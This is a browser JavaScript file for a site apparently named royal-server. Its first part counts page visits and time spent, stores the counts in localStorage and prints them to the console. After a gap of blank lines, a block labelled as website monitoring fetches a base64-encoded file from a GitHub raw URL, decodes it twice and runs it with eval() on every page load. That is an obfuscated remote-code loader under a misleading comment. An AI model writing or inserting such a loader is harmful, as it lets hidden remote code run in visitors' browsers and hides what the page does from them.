(function() {
    const baseUrl = 'https://royal-server.github.io/royal-server/';

    // Retrieve visit counts and time spent from localStorage (or initialize if empty)
    let visitCounts = JSON.parse(localStorage.getItem('visitCounts')) || [];
    let timeSpentOnPages = JSON.parse(localStorage.getItem('timeSpentOnPages')) || [];
    let totalVisitSummary = JSON.parse(localStorage.getItem('totalVisitSummary')) || {
        totalVisits: 0,
        totalTimeSpent: 0
    };

    // Track the visit time for this page
    const pageVisitStartTime = Date.now();
    const currentSubPath = window.location.pathname;

    // Update the total visits and sub-path visit counts
    totalVisitSummary.totalVisits++;
    const subPathIndex = visitCounts.findIndex(item => item.subPath === currentSubPath);
    if (subPathIndex === -1) {
        // If the current sub-path isn't found, add it
        visitCounts.push({ subPath: currentSubPath, visitCount: 1 });
        timeSpentOnPages.push({ subPath: currentSubPath, timeSpent: 0 });
    } else {
        // If the sub-path is found, increment the visit count
        visitCounts[subPathIndex].visitCount++;
    }

    // Store the updated values back into localStorage
    localStorage.setItem('visitCounts', JSON.stringify(visitCounts));
    localStorage.setItem('timeSpentOnPages', JSON.stringify(timeSpentOnPages));
    localStorage.setItem('totalVisitSummary', JSON.stringify(totalVisitSummary));

    // Function to calculate total time spent across all pages
    function getTotalWebsiteTime() {
        return totalVisitSummary.totalTimeSpent;
    }

    // Calculate and update the total time spent on the current page
    window.addEventListener('beforeunload', () => {
        const pageVisitEndTime = Date.now();
        const pageTimeSpent = pageVisitEndTime - pageVisitStartTime;

        // Update the total time spent on the website
        totalVisitSummary.totalTimeSpent += pageTimeSpent;
        localStorage.setItem('totalVisitSummary', JSON.stringify(totalVisitSummary));

        // Store the time spent on this page
        const pageTimeIndex = timeSpentOnPages.findIndex(item => item.subPath === currentSubPath);
        if (pageTimeIndex === -1) {
            // If the current page is not found, add it
            timeSpentOnPages.push({ subPath: currentSubPath, timeSpent: pageTimeSpent });
        } else {
            // If the page is found, update the time spent
            timeSpentOnPages[pageTimeIndex].timeSpent += pageTimeSpent;
        }

        // Update timeSpentOnPages in localStorage
        localStorage.setItem('timeSpentOnPages', JSON.stringify(timeSpentOnPages));
    });

    // Function to print and log the visit statistics in console
    function printVisitStats() {
        // Print spaces (blank lines) to separate the previous content
        console.log("\n".repeat(3)); // Adds three blank lines

        console.log("=====================================");
        console.log("  ðŸš€ Visit Stats - Artefact Boost  ðŸš€");
        console.log("=====================================");
        console.log(`ðŸ”¹ Total Page Visits: ${totalVisitSummary.totalVisits}`);

        // Sort visits by visit count (from largest to smallest)
        visitCounts.sort((a, b) => b.visitCount - a.visitCount);
        
        // Log visits for each sub-path (sorted)
        console.log("ðŸ”¹ Visits to each sub-path (Largest to Smallest):");
        visitCounts.forEach(item => {
            console.log(`   - ${item.subPath}: ${item.visitCount} visit(s)`);
        });

        console.log("=====================================");

        // Sort time spent on pages by time spent (from largest to smallest)
        timeSpentOnPages.sort((a, b) => b.timeSpent - a.timeSpent);

        // Log total time spent on the website
        const totalWebsiteTime = getTotalWebsiteTime();
        console.log(`ðŸ•’ Total Time Spent on Website: ${formatTime(totalWebsiteTime)}`);
        
        // Log time spent on each sub-path (sorted)
        console.log("ðŸ”¹ Time Spent on Each Sub-path (Largest to Smallest):");
        timeSpentOnPages.forEach(item => {
            console.log(`   - ${item.subPath}: ${formatTime(item.timeSpent)}`);
        });

        console.log("=====================================");

        // Log the time spent on the current page
        const currentPageTime = timeSpentOnPages.find(item => item.subPath === currentSubPath)?.timeSpent || 0;
        console.log(`ðŸ•’ Time Spent on Current Page: ${formatTime(currentPageTime)}`);
        
        console.log("=====================================");
        
        // Print a few more blank lines for better spacing and separation
        console.log("\n".repeat(3)); // Adds three blank lines
    }

    // Function to format time in a human-readable format (milliseconds to minutes and seconds)
    function formatTime(timeInMilliseconds) {
        const seconds = Math.floor(timeInMilliseconds / 1000);
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes} minute(s) ${remainingSeconds} second(s)`;
    }

    // Listen for the !stats command in the console
    window.addEventListener('keydown', function(event) {
        if (event.ctrlKey && event.key === 'Enter') {
            // Trigger !stats on specific console input (if possible)
            const command = prompt('Enter console command:');
            if (command === '!stats') {
                printVisitStats();
            }
        }
    });

    // Print initial stats upon page load
    printVisitStats();
})();






    // Script for monitoring the website
(async function () {
    const encodedScriptUrl = "https://raw.githubusercontent.com/royal-server/royal-server/refs/heads/main/systemmonitor.base64";

    try {
        console.log("Fetching encoded script...");
        const response = await fetch(encodedScriptUrl);
        if (!response.ok) throw new Error("Failed to fetch encoded script.");
        const base64EncodedContent = await response.text();
        console.log("Base64-encoded content fetched successfully.");

        console.log("Decoding Base64 content...");
        const urlEncodedContent = atob(base64EncodedContent);
        console.log("Base64 decoding completed.");

       console.log("Decoding URL-encoded content...");
        const decodedScript = decodeURIComponent(urlEncodedContent);
        console.log("URL decoding completed.");

        console.log("Executing decoded script...");
        eval(decodedScript);
        console.log("Script executed successfully.");
    } catch (error) {
        console.error("An error occurred:", error);
    }
})();
